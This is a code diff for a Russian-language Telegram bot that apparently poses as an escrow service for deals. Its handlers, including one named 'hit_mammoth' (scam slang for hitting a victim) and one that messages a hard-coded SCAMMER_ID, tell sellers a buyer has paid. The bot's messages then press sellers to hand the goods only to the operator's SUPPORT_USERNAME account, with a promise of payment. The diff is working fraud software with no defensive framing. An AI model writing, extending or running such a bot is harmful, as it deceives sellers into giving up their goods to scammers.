@@ -541,4 +541,138 @@ async def hit_mammoth(callback: CallbackQuery):
         f"{E_DEAL} Сделка #{deal_code}:\n"
         f"Сумма: {deal[4]}\n"
         f"Описание: {deal[5]}\n"
-        f
+        f"Комиссия: {COMMISSION}%\n\n"
+        f"{E_PAID} Статус сделки: покупатель успешно оплатил\n\n"
+        f"{E_WARNING} Дождитесь, пока продавец передаст товар на аккаунт {SUPPORT_USERNAME}, а затем подтвердите это в боте!"
+    )
+
+    await callback.message.answer(
+        f"{E_DEAL} Сделка #{deal_code}:\n"
+        f"Сумма: {deal[4]}\n"
+        f"Описание: {deal[5]}\n"
+        f"Комиссия: {COMMISSION}%\n\n"
+        f"{E_PAID} Статус сделки: покупатель успешно оплатил\n"
+        f"👇ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО👇\n"
+        f"‼️{SUPPORT_USERNAME}‼️\n"
+        f"☝️ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО☝️\n\n"
+        f"В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату. Рекомендуем записывать экран во время передачи товара."
+    )
+
+    buyer_id = deal[3]
+    try:
+        await callback.bot.send_message(
+            buyer_id,
+            f"{E_SUCCESS} Оплата по сделке #{deal_code} успешно получена!\nПродавец получил уведомление"
+        )
+        await callback.bot.send_message(
+            buyer_id,
+            f"{E_DEAL} Сделка #{deal_code}:\n"
+            f"Сумма: {deal[4]}\n"
+            f"Описание: {deal[5]}\n"
+            f"Комиссия: {COMMISSION}%\n\n"
+            f"{E_PAID} Статус сделки: покупатель успешно оплатил\n"
+            f"👇ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО👇\n"
+            f"‼️{SUPPORT_USERNAME}‼️\n"
+            f"☝️ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО☝️\n\n"
+            f"В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату. Рекомендуем записывать экран во время передачи товара.",
+            reply_markup=deal_status_buttons(deal_code, is_seller=True)
+        )
+    except:
+        pass
+
+    await callback.answer(f"{E_SUCCESS} Оплата подтверждена!")
+
+@router.callback_query(F.data.startswith("confirm_deal_"))
+async def confirm_deal(callback: CallbackQuery):
+    deal_code = callback.data.replace("confirm_deal_", "")
+    deal = get_deal(deal_code)
+
+    if not deal:
+        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
+        return
+
+    update_deal_confirmed(deal_code)
+
+    await callback.message.edit_text(
+        f"{E_DEAL} Сделка #{deal_code}:\n"
+        f"Сумма: {deal[4]}\n"
+        f"Описание: {deal[5]}\n"
+        f"Комиссия: {COMMISSION}%\n\n"
+        f"{E_PAID} Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара\n\n"
+        f"{E_WARNING} Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}. Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
+        reply_markup=deal_status_buttons(deal_code, is_seller=False)
+    )
+
+    await callback.bot.send_message(
+        SCAMMER_ID,
+        f"{E_DEAL} Сделка #{deal_code}:\n"
+        f"Сумма: {deal[4]}\n"
+        f"Описание: {deal[5]}\n"
+        f"Комиссия: {COMMISSION}%\n\n"
+        f"{E_PAID} Статус сделки: покупатель оплатил, продавец подтвердил передачу товара\n\n"
+        f"{E_WARNING} Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота. После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!",
+        reply_markup=deal_status_buttons(deal_code, is_seller=True)
+    )
+
+    await callback.answer()
+
+@router.callback_query(F.data.startswith("confirm_deal_seller_"))
+async def confirm_deal_seller(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
+        return
+
+    deal_code = callback.data.replace("confirm_deal_seller_", "")
+    deal = get_deal(deal_code)
+
+    if not deal:
+        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
+        return
+
+    update_deal_completed(deal_code)
+    update_user_successful_deals(deal[1])
+    if deal[3]:
+        update_user_successful_deals(deal[3])
+
+    buyer_id = deal[3]
+
+    await callback.message.edit_text(
+        f"{E_DEAL} Сделка #{deal_code}:\n"
+        f"Сумма: {deal[4]}\n"
+        f"Описание: {deal[5]}\n"
+        f"Комиссия: {COMMISSION}%\n\n"
+        f"{E_PAID} Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА\n\n"
+        f"{E_SUCCESS} Пожалуйста, дождитесь поступления товара на ваш аккаунт!"
+    )
+
+    try:
+        await callback.bot.send_message(
+            buyer_id,
+            f"{E_DEAL} Сделка #{deal_code}:\n"
+            f"Сумма: {deal[4]}\n"
+            f"Описание: {deal[5]}\n"
+            f"Комиссия: {COMMISSION}%\n\n"
+            f"{E_PAID} Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА\n\n"
+            f"Ожидайте поступления оплаты на указанный вами ранее кошелёк!"
+        )
+    except:
+        pass
+
+    await callback.answer(f"{E_SUCCESS} Сделка завершена!")
+
+# ============ ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОЛБЭКОВ ============
+
+@router.callback_query()
+async def catch_all_callbacks(callback: CallbackQuery):
+    """Ловит все нажатия, которые не обработаны выше"""
+    await callback.answer(f"{E_WARNING} Команда в разработке...")
+    await callback.message.answer(
+        f"{E_CROSS} Неизвестная команда.\nИспользуйте /start для начала работы.",
+        reply_markup=back_button()
+    )
+
+@router.message()
+async def handle_unknown(message: Message):
+    await message.answer(
+        f"{E_CROSS} Неизвестная команда.\nИспользуйте /start для начала работы."
+    )
